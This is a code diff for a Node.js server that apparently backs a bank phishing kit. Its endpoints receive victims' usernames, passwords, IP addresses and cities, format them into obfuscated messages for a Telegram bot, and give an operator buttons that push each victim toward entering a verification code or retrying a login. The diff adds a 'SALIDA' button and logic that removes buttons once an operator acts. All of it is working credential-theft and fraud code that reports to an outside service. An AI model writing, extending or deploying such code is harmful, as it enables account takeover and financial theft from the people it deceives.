@@ -58,7 +58,7 @@ function cargarCliente(txid) {
 app.post('/enviar', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-👛D4VI SV👛
+🔴D4VI SV🔴
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
 🔐 CL4V: <code>${clavv}</code>
@@ -76,8 +76,8 @@ app.post('/enviar', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-     
-        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
+        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` },
+        { text: "🗑SALIDA", callback_data: `laderrorselfi:${txid}` }
       ],
       [
         { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
@@ -101,7 +101,7 @@ app.post('/enviar', async (req, res) => {
 app.post('/enviar2', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-👛D4VI SV👛
+🔴D4VI SV🔴
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
 
@@ -121,8 +121,8 @@ app.post('/enviar2', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        
-        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
+        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` },
+        { text: "🗑SALIDA", callback_data: `laderrorselfi:${txid}` }
       ],
       [
         { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
@@ -147,7 +147,7 @@ app.post('/enviar2', async (req, res) => {
 app.post('/enviar3', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-👛D4VI SV👛
+🔴D4VI SV🔴
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
 
@@ -167,8 +167,8 @@ app.post('/enviar3', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-       
-        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
+        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` },
+        { text: "🗑SALIDA", callback_data: `laderrorselfi:${txid}` }
       ],
       [
         { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
@@ -201,7 +201,6 @@ app.get('/get-status', (req, res) => {
   res.json({ status: cliente ? cliente.status : 'esperando' });
 });
 
-// NUEVO: Webhook para Telegram (maneja callbacks de botones)
 app.post('/telegram-webhook', async (req, res) => {
   try {
     const update = req.body;
@@ -209,35 +208,54 @@ app.post('/telegram-webhook', async (req, res) => {
       const query = update.callback_query;
       const data = query.data;
       const callbackQueryId = query.id;
+      const chatId = query.message.chat.id;
+      const messageId = query.message.message_id;
 
       console.log(`✅ Callback recibido: ${data}`);
 
-      // Responder a Telegram para confirmar (evita "cargando" infinito en el botón)
+      // 1. Responder inmediatamente al callback (quita el "cargando...")
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           callback_query_id: callbackQueryId,
-          text: 'Acción procesada',  // Mensaje opcional que ve el usuario
+          // text: 'Procesado',     // opcional
+          // show_alert: false,
         })
       });
 
-      // Actualizar status basado en callback_data
+      // 2. Quitar los botones del mensaje
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] }   // ← teclado vacío = desaparecen los botones
+          // Alternativa: reply_markup: {}        // también suele funcionar
+          // Alternativa más agresiva: reply_markup: null  (a veces da error)
+        })
+      });
+
+      // 3. (Opcional) Cambiar el texto del mensaje para que quede más claro
+      // await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, { ... });
+
+      // 4. Procesar la acción como antes
       const [action, txid] = data.split(':');
       const cliente = cargarCliente(txid);
       if (cliente) {
-        cliente.status = action;  // e.g., "elopete", "laderrorselfi", "errorlogo"
+        cliente.status = action;
         guardarCliente(txid, cliente);
         console.log(`✅ Status actualizado para ${txid}: ${action}`);
-      } else {
-        console.log(`❌ Cliente no encontrado para txid: ${txid}`);
       }
-    }
 
-    res.sendStatus(200);  // Siempre responde 200 para que Telegram no reenvíe
+      res.sendStatus(200);
+    } else {
+      res.sendStatus(200);
+    }
   } catch (error) {
     console.error('🔥 Error en webhook:', error);
-    res.sendStatus(500);
+    res.sendStatus(200); // ¡Importante! Telegram exige 200 aunque haya error
   }
 });
 
